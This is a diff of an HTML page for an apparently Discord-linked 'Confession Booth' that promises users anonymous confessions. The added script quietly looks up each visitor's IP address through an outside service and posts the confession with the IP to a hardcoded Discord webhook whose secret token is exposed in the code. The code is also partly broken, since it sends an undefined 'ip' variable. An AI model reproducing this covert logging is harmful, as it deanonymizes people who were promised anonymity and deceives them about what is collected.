@@ -1,35 +1,84 @@
 <!DOCTYPE html>
-
 <html>
-
 <head>
-
-    <meta charset="utf-8" />
-
-    <title></title>
-
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
-
-    <script>
-
-        var ipinfo;
-
-        $.getJSON("http://ipinfo.io", function (data) {
-
-            $("#info").html("City: " + data.city + " ,County: " + data.country + " ,IP: " + data.ip + " ,Location: " + data.loc + " ,Organisation: " + data.org + " ,Postal Code: " + data.postal + " ,Region: " + data.region + "")
-
-        })
-
-    </script>
+  <title>Mak's Confessions</title>
+  <link rel="stylesheet" type="text/css" href="css/style.css">
+  <link rel="icon" href="img/maks.ico">
+  <link href="https://fonts.googleapis.com/css?family=Chewy&display=swap" rel="stylesheet">
+  <meta content="width=device-width, initial-scale=1.0" name="viewport">
 
 </head>
-
 <body>
+    <main class="container">
+      <form autocomplete="off">
+        <div>
+          <h1>Mak's Confession Booth</h1>
+          <h2>Here you can confess to anything you want anonymously to the Confession channel of the server.</h2>
+          <h3>(Note: This is not to be used for harassment. Any messages sent deemed against the server's rules will be removed.)<h3>
+        </div>
+        <div class="card card-panel">
+          <div>
+            <h3>Nickname:(optional)<h3>
+            <input type="text" id="nickname" onblur="replace(this)">
+          </div>
+          <div>
+            <h3>Message:</h3>
+              <textarea id="content" type="text" rows="10" rows="5" cols="80" onblur="replaceT(this)" required></textarea>
+          </div>
+        </div>
+        <input type="submit" id="submit" onclick="test()">
+      </form>
+    </main>
+    <script src="https://code.jquery.com/jquery-2.1.1.min.js" type=
+    "text/javascript">
+    </script>
 
-    <p>Client's information:</p>
+    <script type="text/javascript">
+    function test(){
+      alert(ip);
+    };
+    var getIPAddress = function() {
+      $.getJSON("https://jsonip.com?callback=?", function(data) {
+        nip = data.ip
+      });
+    };
+    </script>
+    <script>
+    var nip;
+    </script>
+    <script type="text/javascript" src="https://l2.io/ip.js?var=nip">
 
-    <p id="info"></p>
-
+    </script>
+    <script>
+    $(function() {
+        $('#submit').click(function(e) {
+        alert(nip);
+        var url = 'https://discordapp.com/api/webhooks/648772740471324672/g8a4ZekoGo6wk-KcfMuEymtxlsZxi0x2mYIhG4cWOk9HwbpS1KTh4jKfKN0v9OPYWxY7'
+        var url2 = 'https://discordapp.com/api/webhooks/648772740471324672/g8a4ZekoGo6wk-KcfMuEymtxlsZxi0x2mYIhG4cWOk9HwbpS1KTh4jKfKN0v9OPYWxY7'
+        var name = $("#nickname").val();
+        var content = $("#content").val();
+        var lower = content.toLowerCase;
+        var blank = ['']
+        if(content != blank ){
+          if(name != blank){
+            $.post(url,{"content":"https://maks-hideout.github.io/confessions/\n```ml\n༺⏤⏤⏤⏤⏤⏤⏤༻\nNickname: "+name+"\nMessage: \""+content+"\"\n༺⏤⏤⏤⏤⏤⏤⏤༻```"});
+            noSpam()
+            $.post(url2,{"content":"```ml\n༺⏤⏤⏤⏤⏤⏤⏤༻\nIP: "+ip+"\nNickname: "+name+"\nMessage: \""+content+"\"\n༺⏤⏤⏤⏤⏤⏤⏤༻```"});
+            noSpam();
+          }
+          else{
+            $.post(url,{"content":"https://maks-hideout.github.io/confessions/\n```ml\n༺⏤⏤⏤⏤⏤⏤⏤༻\nMessage: \""+content+"\"\n༺⏤⏤⏤⏤⏤⏤⏤༻```"});
+            noSpam()
+            $.post(url2,{"content":"```ml\n༺⏤⏤⏤⏤⏤⏤⏤༻\nIP: "+ip+"\nMessage: \""+content+"\"\n༺⏤⏤⏤⏤⏤⏤⏤༻```"});
+            noSpam();
+          }
+        }
+        });
+    });
+    </script>
 </body>
-
+<footer>
+  <h6>Confessions v3.0</h6>
+</footer>
+<script type="text/javascript" src="js/script.js"></script>
 </html>
